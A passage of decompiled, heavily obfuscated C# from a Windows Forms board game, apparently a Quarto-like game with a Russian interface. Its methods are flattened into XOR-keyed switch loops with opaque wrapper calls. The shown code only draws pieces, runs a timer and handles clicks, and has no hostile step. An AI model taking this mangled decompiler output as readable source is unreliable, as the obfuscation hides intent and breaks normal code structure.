using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			while (true)
			{
				int num = -1723327128;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x97028C89u) % 5u)
					{
					case 4u:
						Dark = dark;
						Big = big;
						Square = square;
						Point = point;
						num = (int)(num2 * 465221922) ^ -1480994310;
						continue;
					case 3u:
						num = ((int)num2 * -1866633229) ^ -548418672;
						continue;
					case 1u:
						num = (int)((num2 * 1454175126) ^ 0x1AD46597);
						continue;
					default:
						return;
					case 0u:
						break;
					case 2u:
						return;
					}
					break;
				}
			}
		}

		public Figurine(Figurine copy)
		{
			while (true)
			{
				int num = -683886628;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0xFCF31038u) % 7u)
					{
					case 5u:
						Square = copy.Square;
						num = ((int)num2 * -1372274502) ^ -1802568045;
						continue;
					case 4u:
						Dark = copy.Dark;
						num = (int)((num2 * 39815243) ^ 0x798ACE78);
						continue;
					case 2u:
						num = (int)((num2 * 1102371994) ^ 0x1D0683EE);
						continue;
					case 1u:
						Point = copy.Point;
						num = (int)((num2 * 1064149439) ^ 0x11B3BEF);
						continue;
					case 0u:
						Big = copy.Big;
						num = ((int)num2 * -47413173) ^ 0xFCD83C9;
						continue;
					default:
						return;
					case 3u:
						break;
					case 6u:
						return;
					}
					break;
				}
			}
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		InitializeComponent();
		Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
		pictureBox = new PictureBox[4, 4];
		borderBox = new PictureBox[4, 4];
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < 4; j++)
			{
				double num = ((j < 2) ? 0.0 : 4.1);
				PictureBox[,] array = pictureBox;
				int num2 = i;
				int num3 = j;
				PictureBox obj = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
				Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)j + num) * (double)size), 4 + i * size));
				Form1.smethod_5((Control)(object)obj, Color.White);
				array[num2, num3] = obj;
				Form1.smethod_6((Control)(object)pictureBox[i, j], new MouseEventHandler(PictureBoxIJ_MouseDown));
				PictureBox[,] array2 = borderBox;
				int num4 = i;
				int num5 = j;
				PictureBox obj2 = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
				Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)j + num) * (double)size), 1 + i * size));
				Form1.smethod_7((Control)(object)obj2, bool_0: false);
				array2[num4, num5] = obj2;
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[i, j]);
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[i, j]);
			}
		}
		Form3 form_ = new Form3();
		Form1.smethod_10((Form)(object)form_, (Form)(object)this);
		menu = (Form)(object)form_;
		Form1.smethod_11((Control)(object)menu);
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		while (true)
		{
			int num = 220672169;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xC35D642u) % 8u)
				{
				case 7u:
				{
					int num3;
					if (Form1.smethod_16((Control)(object)menu) >= 296)
					{
						num = 1142010034;
						num3 = 1142010034;
					}
					else
					{
						num = 138461795;
						num3 = 138461795;
					}
					continue;
				}
				case 6u:
					num = ((int)num2 * -451147960) ^ 0x682109E5;
					continue;
				case 4u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = ((int)num2 * -2010912712) ^ -980591384;
					continue;
				}
				case 3u:
					Form1.smethod_15(timer1);
					num = ((int)num2 * -99564746) ^ -1521882994;
					continue;
				case 2u:
					num = (int)((num2 * 1930718721) ^ 0x477A949F);
					continue;
				case 1u:
					num = 1399047982;
					continue;
				case 5u:
					break;
				default:
					Form1.smethod_14(menu);
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		board = new Figurine[4, 4];
		int num4 = default(int);
		int num3 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = -544594281;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xAB953045u) % 20u)
				{
				case 19u:
					num = -1398110728;
					continue;
				case 18u:
					Paint_Board();
					num = ((int)num2 * -1453998700) ^ -1296085740;
					continue;
				case 17u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					Paint_Storage();
					num = ((int)num2 * -995117461) ^ 0x3AD300FA;
					continue;
				case 16u:
					num4++;
					num = ((int)num2 * -818596681) ^ 0x5A7089F;
					continue;
				case 15u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					num = ((int)num2 * -1803368059) ^ -627515903;
					continue;
				case 14u:
					storage = new Figurine[4, 4];
					num = (int)(num2 * 547580631) ^ -2036801273;
					continue;
				case 13u:
					num = (int)((num2 * 85561955) ^ 0xC561C5E);
					continue;
				case 12u:
					num3 = 0;
					num = (int)(num2 * 1263315765) ^ -600775662;
					continue;
				case 11u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: false);
					num = (int)(num2 * 401279796) ^ -1895901663;
					continue;
				case 10u:
					num = (int)(num2 * 1468215713) ^ -1980622799;
					continue;
				case 9u:
				{
					int num6;
					int num7;
					if (flag)
					{
						num6 = -240053523;
						num7 = -240053523;
					}
					else
					{
						num6 = -751634869;
						num7 = -751634869;
					}
					num = num6 ^ ((int)num2 * -1209643873);
					continue;
				}
				case 8u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = (int)((num2 * 1264414058) ^ 0x76FF221F);
					continue;
				case 7u:
				{
					int num5;
					if (num3 >= 4)
					{
						num = -324258129;
						num5 = -324258129;
					}
					else
					{
						num = -395710930;
						num5 = -395710930;
					}
					continue;
				}
				case 6u:
					flag = num4 < 4;
					num = -678488336;
					continue;
				case 5u:
					storage[num3, num4] = new Figurine(num3 < 2, num4 % 2 == 0, num4 < 2, num3 % 2 == 1);
					num = ((int)num2 * -843877281) ^ 0xD8D3405;
					continue;
				case 4u:
					num = ((int)num2 * -495748090) ^ -1638695032;
					continue;
				case 3u:
					num4 = 0;
					num = -1741436897;
					continue;
				case 1u:
					num3++;
					num = (int)((num2 * 1762062788) ^ 0x49BF128A);
					continue;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		bool flag2 = default(bool);
		int num7 = default(int);
		float num20 = default(float);
		int num8 = default(int);
		bool big = default(bool);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num6 = default(float);
		float num4 = default(float);
		float num5 = default(float);
		float num3 = default(float);
		bool flag = default(bool);
		bool square = default(bool);
		while (true)
		{
			int num = 1932353894;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x241A11B7u) % 37u)
				{
				case 36u:
				{
					int num13;
					int num14;
					if (!flag2)
					{
						num13 = 567301329;
						num14 = 567301329;
					}
					else
					{
						num13 = 1655659202;
						num14 = 1655659202;
					}
					num = num13 ^ (int)(num2 * 1975569247);
					continue;
				}
				case 35u:
					num7++;
					num = (int)((num2 * 1958112306) ^ 0x1BD8CFE0);
					continue;
				case 34u:
					num20 = 1f;
					num = (int)(num2 * 665889982) ^ -413273303;
					continue;
				case 33u:
					num20 = 0.7f;
					num = 1780620291;
					continue;
				case 32u:
					num8++;
					num = ((int)num2 * -1107412214) ^ -1300467796;
					continue;
				case 31u:
				{
					int num11;
					int num12;
					if (board[num7, num8].Dark)
					{
						num11 = -1770336122;
						num12 = -1770336122;
					}
					else
					{
						num11 = -169695481;
						num12 = -169695481;
					}
					num = num11 ^ (int)(num2 * 1344127278);
					continue;
				}
				case 30u:
				{
					int num16;
					int num17;
					if (big)
					{
						num16 = -1356429643;
						num17 = -1356429643;
					}
					else
					{
						num16 = -366211701;
						num17 = -366211701;
					}
					num = num16 ^ ((int)num2 * -1056276397);
					continue;
				}
				case 29u:
					big = board[num7, num8].Big;
					num = 1512768132;
					continue;
				case 28u:
					num = ((int)num2 * -118083961) ^ 0x2876C689;
					continue;
				case 27u:
				{
					int num21;
					int num22;
					if (!board[num7, num8].Point)
					{
						num21 = -59651048;
						num22 = -59651048;
					}
					else
					{
						num21 = -1501894707;
						num22 = -1501894707;
					}
					num = num21 ^ (int)(num2 * 1911543776);
					continue;
				}
				case 24u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num7 = 0;
					num = ((int)num2 * -1377665972) ^ 0x1F6765A8;
					continue;
				case 23u:
					Form1.smethod_28(graphics_, brush_, num6 + (float)(num8 * size), num6 + (float)(num7 * size), num4, num4);
					num = ((int)num2 * -841828730) ^ -591594747;
					continue;
				case 22u:
					num = ((int)num2 * -773652267) ^ 0x431E788D;
					continue;
				case 21u:
					brush_ = Form1.smethod_26();
					num = 1746514863;
					continue;
				case 20u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 6748425) ^ -826832923;
					continue;
				case 19u:
					num5 = 1f - num20 * 0.9f / (float)Form1.smethod_27(2.0);
					num3 = (float)size * num20;
					num = 1878309697;
					continue;
				case 18u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num6 + (float)(num8 * size), num6 + (float)(num7 * size), num4, num4);
					num = (int)((num2 * 1817688379) ^ 0x52732D86);
					continue;
				case 17u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					num = ((int)num2 * -189716177) ^ 0xD90CDEC;
					continue;
				case 16u:
					num = ((int)num2 * -1324341957) ^ -1334065269;
					continue;
				case 15u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num8 + 0.05f) * (float)size, ((float)num7 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = 1226292312;
					continue;
				case 14u:
					num5 = 1f - num20 * 0.4f / (float)Form1.smethod_27(2.0);
					num6 = (float)size * (num5 / 2f);
					num = 2132981229;
					continue;
				case 13u:
					num4 = num3 * 0.4f / (float)Form1.smethod_27(2.0);
					num = (int)((num2 * 1148345905) ^ 0x64FAB750);
					continue;
				case 12u:
				{
					int num18;
					int num19;
					if (!flag)
					{
						num18 = -1982646567;
						num19 = -1982646567;
					}
					else
					{
						num18 = -1911451302;
						num19 = -1911451302;
					}
					num = num18 ^ ((int)num2 * -604984811);
					continue;
				}
				case 11u:
					num8 = 0;
					num = 2117732368;
					continue;
				case 10u:
					square = board[num7, num8].Square;
					num = ((int)num2 * -1551481242) ^ 0x7489BF2B;
					continue;
				case 9u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -293455583) ^ -56780442;
					continue;
				case 8u:
					Form1.smethod_24(graphics_, brush_, num6 + (float)(num8 * size), num6 + (float)(num7 * size), num4, num4);
					num = 1278029569;
					continue;
				case 7u:
					num = 146782002;
					continue;
				case 6u:
					num = 1760811810;
					continue;
				case 5u:
				{
					int num15;
					if (num8 < 4)
					{
						num = 1828551895;
						num15 = 1828551895;
					}
					else
					{
						num = 1163996331;
						num15 = 1163996331;
					}
					continue;
				}
				case 4u:
				{
					int num9;
					int num10;
					if (!square)
					{
						num9 = -250962957;
						num10 = -250962957;
					}
					else
					{
						num9 = -1511291743;
						num10 = -1511291743;
					}
					num = num9 ^ ((int)num2 * -750052208);
					continue;
				}
				case 3u:
					flag2 = num7 < 4;
					num = 15311778;
					continue;
				case 2u:
					flag = board[num7, num8] != null;
					num = (int)(num2 * 902484677) ^ -853570397;
					continue;
				case 1u:
					num6 = (float)size * (num5 / 2f);
					num = ((int)num2 * -1049050814) ^ 0x4294880B;
					continue;
				case 0u:
					num4 = num3 * 0.9f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -1565993077) ^ 0x384ED297;
					continue;
				default:
					return;
				case 25u:
					break;
				case 26u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		int num = 0;
		float num6 = default(float);
		int num7 = default(int);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num8 = default(float);
		float num9 = default(float);
		float num16 = default(float);
		float num17 = default(float);
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num2 = 61905792;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0x173A80BBu) % 34u)
				{
				case 33u:
					num2 = (int)(num3 * 260398063) ^ -1907699251;
					continue;
				case 32u:
					num6 = 1f;
					num2 = (int)((num3 * 131675071) ^ 0xFC5F61F);
					continue;
				case 31u:
					num7++;
					num2 = 1407931291;
					continue;
				case 28u:
					Form1.smethod_30((Control)(object)pictureBox[num, num7]);
					num2 = 1683239728;
					continue;
				case 27u:
					Form1.smethod_24(graphics_, brush_, num8, num8, num9, num9);
					num2 = 2097128038;
					continue;
				case 26u:
				{
					num8 = (float)size * (num16 / 2f) - 4f;
					num9 = num17 * 0.4f / (float)Form1.smethod_27(2.0);
					int num18;
					int num19;
					if (!storage[num, num7].Point)
					{
						num18 = -56818937;
						num19 = -56818937;
					}
					else
					{
						num18 = -1105562838;
						num19 = -1105562838;
					}
					num2 = num18 ^ ((int)num3 * -307527667);
					continue;
				}
				case 25u:
					num6 = 0.7f;
					num2 = 181306179;
					continue;
				case 24u:
				{
					int num14;
					if (!storage[num, num7].Big)
					{
						num2 = 1609578228;
						num14 = 1609578228;
					}
					else
					{
						num2 = 2123100447;
						num14 = 2123100447;
					}
					continue;
				}
				case 23u:
					num2 = ((int)num3 * -1554602573) ^ 0x68E7B58;
					continue;
				case 22u:
					num++;
					num2 = ((int)num3 * -1708563623) ^ 0x1D4ED169;
					continue;
				case 21u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num8, num8, num9, num9);
					num2 = ((int)num3 * -819925525) ^ -1233016627;
					continue;
				case 20u:
					num2 = (int)(num3 * 272370588) ^ -281595845;
					continue;
				case 19u:
				{
					int num20;
					int num21;
					if (flag2)
					{
						num20 = 651914328;
						num21 = 651914328;
					}
					else
					{
						num20 = 369268675;
						num21 = 369268675;
					}
					num2 = num20 ^ (int)(num3 * 1768698655);
					continue;
				}
				case 18u:
					num17 = (float)size * num6;
					num8 = (float)size * (num16 / 2f) - 4f;
					num9 = num17 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = ((int)num3 * -1300926547) ^ -329940393;
					continue;
				case 17u:
					num16 = 1f - num6 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = 537113173;
					continue;
				case 16u:
					num7 = 0;
					num2 = 1619389027;
					continue;
				case 15u:
					num2 = ((int)num3 * -168223091) ^ -1476137509;
					continue;
				case 14u:
					num16 = 1f - num6 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = 1241986075;
					continue;
				case 13u:
					num2 = (int)(num3 * 1853538445) ^ -1535272029;
					continue;
				case 12u:
					flag2 = num < 4;
					num2 = 182004444;
					continue;
				case 11u:
					Form1.smethod_20(pictureBox[num, num7], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num, num7]), Form1.smethod_16((Control)(object)pictureBox[num, num7])));
					num2 = ((int)num3 * -1481330468) ^ -1331428806;
					continue;
				case 10u:
				{
					int num15;
					if (num7 < 4)
					{
						num2 = 251348178;
						num15 = 251348178;
					}
					else
					{
						num2 = 1354750027;
						num15 = 1354750027;
					}
					continue;
				}
				case 9u:
					flag = storage[num, num7] != null;
					num2 = 1193798676;
					continue;
				case 8u:
					brush_ = Form1.smethod_25();
					num2 = (int)((num3 * 16538663) ^ 0x3F19A8FB);
					continue;
				case 7u:
				{
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num, num7]));
					int num12;
					int num13;
					if (!storage[num, num7].Dark)
					{
						num12 = -233889405;
						num13 = -233889405;
					}
					else
					{
						num12 = -1533905257;
						num13 = -1533905257;
					}
					num2 = num12 ^ (int)(num3 * 188510740);
					continue;
				}
				case 6u:
				{
					int num10;
					int num11;
					if (num7 < 2)
					{
						num10 = -2011954640;
						num11 = -2011954640;
					}
					else
					{
						num10 = -1101328166;
						num11 = -1101328166;
					}
					num2 = num10 ^ ((int)num3 * -400999039);
					continue;
				}
				case 5u:
					Form1.smethod_28(graphics_, brush_, num8, num8, num9, num9);
					num2 = (int)((num3 * 804146725) ^ 0x78AEDE5E);
					continue;
				case 4u:
					brush_ = Form1.smethod_26();
					num2 = 1054472019;
					continue;
				case 3u:
					num2 = (int)((num3 * 366370694) ^ 0x3B7CE133);
					continue;
				case 2u:
					num2 = (int)(num3 * 1802782532) ^ -97504646;
					continue;
				case 1u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = 146684670;
						num5 = 146684670;
					}
					else
					{
						num4 = 58021775;
						num5 = 58021775;
					}
					num2 = num4 ^ (int)(num3 * 659611305);
					continue;
				}
				case 0u:
					num2 = ((int)num3 * -1397675572) ^ 0x7EF26548;
					continue;
				default:
					return;
				case 30u:
					break;
				case 29u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		int num9 = default(int);
		int num5 = default(int);
		int num8 = default(int);
		int num6 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = 246572869;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x30A88D96u) % 32u)
				{
				case 31u:
					num = ((int)num2 * -976684121) ^ 0x48ED2327;
					continue;
				case 29u:
					Form1.smethod_5((Control)(object)borderBox[num9, num5], Color.Blue);
					num = ((int)num2 * -1253496282) ^ 0x334D7D1E;
					continue;
				case 28u:
					num8++;
					num = (int)((num2 * 345367099) ^ 0x5A96E813);
					continue;
				case 27u:
				{
					int num7;
					if (num6 < 4)
					{
						num = 478906496;
						num7 = 478906496;
					}
					else
					{
						num = 1802757738;
						num7 = 1802757738;
					}
					continue;
				}
				case 26u:
					num5 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -1928514964) ^ -108438765;
					continue;
				case 25u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = 656286754;
					continue;
				case 24u:
					num = (int)(num2 * 389827181) ^ -1303342866;
					continue;
				case 23u:
					Form1.smethod_36(timer1);
					num = (int)((num2 * 645034453) ^ 0xF804454);
					continue;
				case 22u:
					Form1.smethod_7((Control)(object)pictureBox[num8, num6], bool_0: true);
					num = 232722921;
					continue;
				case 21u:
					num = ((int)num2 * -351655428) ^ 0x6B8CDDDE;
					continue;
				case 20u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					Form1.smethod_35(timer1, bool_0: true);
					num = ((int)num2 * -130910177) ^ 0x6158ECDD;
					continue;
				case 19u:
					Form1_Load(this, Form1.smethod_31());
					num = (int)(num2 * 2003720574) ^ -1095148428;
					continue;
				case 18u:
					num6 = 0;
					num = 2016731189;
					continue;
				case 17u:
					flag = num8 < 4;
					num = 220678246;
					continue;
				case 16u:
				{
					int num10;
					int num11;
					if (flag)
					{
						num10 = 666534324;
						num11 = 666534324;
					}
					else
					{
						num10 = 753094441;
						num11 = 753094441;
					}
					num = num10 ^ (int)(num2 * 521930557);
					continue;
				}
				case 15u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -1749504062) ^ 0x7B2A5A23;
					continue;
				case 14u:
					step = 1;
					num = ((int)num2 * -1199712580) ^ -116294436;
					continue;
				case 13u:
					num = ((int)num2 * -175465572) ^ 0x4B8A1C5F;
					continue;
				case 12u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = ((int)num2 * -650408900) ^ 0x363EDDC8;
					continue;
				case 11u:
					step = 0;
					num = ((int)num2 * -619616389) ^ 0xAEADC32;
					continue;
				case 9u:
					num9 = Form1.smethod_33(rnd, 4);
					num = 641554028;
					continue;
				case 8u:
					num6++;
					num = ((int)num2 * -423563556) ^ -1257514739;
					continue;
				case 7u:
					num = ((int)num2 * -1920857629) ^ 0x6D28554;
					continue;
				case 6u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 254838459) ^ -4841448;
					continue;
				case 5u:
					num = (int)(num2 * 526749588) ^ -29137013;
					continue;
				case 4u:
					num8 = 0;
					num = (int)((num2 * 2112538269) ^ 0x1B51A853);
					continue;
				case 3u:
					num = ((int)num2 * -1340729916) ^ -1927085151;
					continue;
				case 2u:
					num = ((int)num2 * -306093487) ^ -28209075;
					continue;
				case 1u:
					num = (int)(num2 * 202618862) ^ -834692442;
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (turn)
					{
						num3 = 1507228003;
						num4 = 1507228003;
					}
					else
					{
						num3 = 1242782367;
						num4 = 1242782367;
					}
					num = num3 ^ ((int)num2 * -1235537504);
					continue;
				}
				default:
					return;
				case 10u:
					break;
				case 30u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		time = time.AddSeconds(1.0);
		Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
		while (true)
		{
			int num = 1328164661;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8F89726u) % 3u)
				{
				case 1u:
					goto IL_0041;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_0041:
				num = ((int)num2 * -469253283) ^ -1075819258;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0265: Unknown result type (might be due to invalid IL or missing references)
		//IL_027b: Expected O, but got Unknown
		int num5 = default(int);
		int num3 = default(int);
		int num11 = default(int);
		int num4 = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		while (true)
		{
			int num = 812953069;
			while (true)
			{
				uint num2;
				int num6;
				switch ((num2 = (uint)num ^ 0x55D40E4Fu) % 24u)
				{
				case 23u:
					num5 -= 4;
					num = (int)((num2 * 627339091) ^ 0x4A107936);
					continue;
				case 22u:
					Form1.smethod_5((Control)(object)borderBox[num3, num11], Color.White);
					num = 586368774;
					continue;
				case 21u:
					num = (int)(num2 * 2134711622) ^ -1667744248;
					continue;
				case 20u:
					if (storage[num4, num5] != null)
					{
						num = 2064939669;
						continue;
					}
					num6 = 0;
					goto IL_006d;
				case 19u:
					flag = num11 < 4;
					num = 103412196;
					continue;
				case 18u:
					num = (int)((num2 * 1553334640) ^ 0x6BB25A90);
					continue;
				case 17u:
				{
					int num9;
					int num10;
					if (flag2)
					{
						num9 = 70100190;
						num10 = 70100190;
					}
					else
					{
						num9 = 16050752;
						num10 = 16050752;
					}
					num = num9 ^ (int)(num2 * 1148832155);
					continue;
				}
				case 16u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)(num2 * 114034759) ^ -1586228758;
					continue;
				case 15u:
					num11 = 0;
					num = 1922702129;
					continue;
				case 13u:
				{
					int num13;
					int num14;
					if (flag3)
					{
						num13 = 137057556;
						num14 = 137057556;
					}
					else
					{
						num13 = 291886719;
						num14 = 291886719;
					}
					num = num13 ^ ((int)num2 * -1983303212);
					continue;
				}
				case 11u:
				{
					int num12;
					if (num3 < 4)
					{
						num = 1149322032;
						num12 = 1149322032;
					}
					else
					{
						num = 371008002;
						num12 = 371008002;
					}
					continue;
				}
				case 10u:
					num4 = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null)).Y / size;
					num5 = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null)).X / size;
					flag3 = num5 > 1;
					num = (int)((num2 * 89210981) ^ 0x356886A8);
					continue;
				case 9u:
					num = (int)((num2 * 365203586) ^ 0x62192AC1);
					continue;
				case 8u:
					num = (int)(num2 * 563731217) ^ -132043729;
					continue;
				case 7u:
					num3 = 0;
					num = ((int)num2 * -1773827272) ^ 0x5F7C947C;
					continue;
				case 6u:
					num = (int)(num2 * 13082404) ^ -369536292;
					continue;
				case 5u:
					Form1.smethod_5((Control)(object)borderBox[num4, num5], Color.Red);
					num = ((int)num2 * -1251722230) ^ -703771;
					continue;
				case 4u:
					num11++;
					num = (int)((num2 * 1591109534) ^ 0x64488D5C);
					continue;
				case 3u:
				{
					int num7;
					int num8;
					if (flag)
					{
						num7 = -815687620;
						num8 = -815687620;
					}
					else
					{
						num7 = -146447278;
						num8 = -146447278;
					}
					num = num7 ^ ((int)num2 * -1925332665);
					continue;
				}
				case 2u:
					num6 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num4, num5]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_006d;
				case 1u:
					num = ((int)num2 * -994256450) ^ 0xFBE4645;
					continue;
				case 0u:
					num3++;
					num = (int)(num2 * 1412938335) ^ -350415324;
					continue;
				default:
					return;
				case 14u:
					break;
				case 12u:
					return;
					IL_006d:
					flag2 = (byte)num6 != 0;
					num = 929615334;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0136: Unknown result type (might be due to invalid IL or missing references)
		//IL_014c: Expected O, but got Unknown
		bool flag2 = default(bool);
		int num8 = default(int);
		bool flag = default(bool);
		int num5 = default(int);
		bool flag3 = default(bool);
		int num10 = default(int);
		Graphics graphics_ = default(Graphics);
		int num9 = default(int);
		while (true)
		{
			int num = 518802437;
			while (true)
			{
				uint num2;
				int num12;
				switch ((num2 = (uint)num ^ 0x45F0A71Bu) % 26u)
				{
				case 25u:
				{
					int num6;
					int num7;
					if (!flag2)
					{
						num6 = 1277407076;
						num7 = 1277407076;
					}
					else
					{
						num6 = 549932426;
						num7 = 549932426;
					}
					num = num6 ^ (int)(num2 * 1686429820);
					continue;
				}
				case 24u:
					Paint_Board();
					num = ((int)num2 * -561076214) ^ 0x69CB93E6;
					continue;
				case 23u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -503471655) ^ -792876227;
					continue;
				case 22u:
					num8 = 0;
					num = 69133450;
					continue;
				case 21u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = ((int)num2 * -1269329367) ^ -1470972473;
					continue;
				case 19u:
					flag2 = num8 < 4;
					num = 1603421176;
					continue;
				case 18u:
					flag = num5 < 4;
					num = 572424451;
					continue;
				case 17u:
					num5++;
					num = (int)(num2 * 1829685585) ^ -313460874;
					continue;
				case 16u:
				{
					int num13;
					int num14;
					if (flag3)
					{
						num13 = 1764937924;
						num14 = 1764937924;
					}
					else
					{
						num13 = 155914493;
						num14 = 155914493;
					}
					num = num13 ^ (int)(num2 * 127591110);
					continue;
				}
				case 15u:
					num = (int)(num2 * 1161725278) ^ -470518365;
					continue;
				case 13u:
					num = ((int)num2 * -1619717434) ^ -1307718491;
					continue;
				case 12u:
					num10 = Form1.smethod_39(e) / size;
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = ((int)num2 * -720612631) ^ -2026192850;
						continue;
					}
					num12 = 0;
					goto IL_0170;
				case 11u:
					num5 = 0;
					num = ((int)num2 * -343716846) ^ 0x58A29AB;
					continue;
				case 10u:
					num8++;
					num = 69133450;
					continue;
				case 9u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)((num2 * 2064462456) ^ 0x755ECE76);
					continue;
				case 8u:
					Form1.smethod_45(graphics_);
					num = ((int)num2 * -588995870) ^ -2017815453;
					continue;
				case 7u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num9 + 0.05f) * (float)size, ((float)num10 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1228060545) ^ 0x32368A52;
					continue;
				case 6u:
					num9 = Form1.smethod_38(e) / size;
					num = (int)((num2 * 2130884428) ^ 0x27C6A543);
					continue;
				case 5u:
					num12 = ((board[num10, num9] == null) ? 1 : 0);
					goto IL_0170;
				case 4u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 1159354871) ^ 0x194C62AA);
					continue;
				case 3u:
				{
					int num11;
					if (Form1.smethod_41((Control)(object)borderBox[num5, num8]) == Color.Blue)
					{
						num = 265723987;
						num11 = 265723987;
					}
					else
					{
						num = 1708628887;
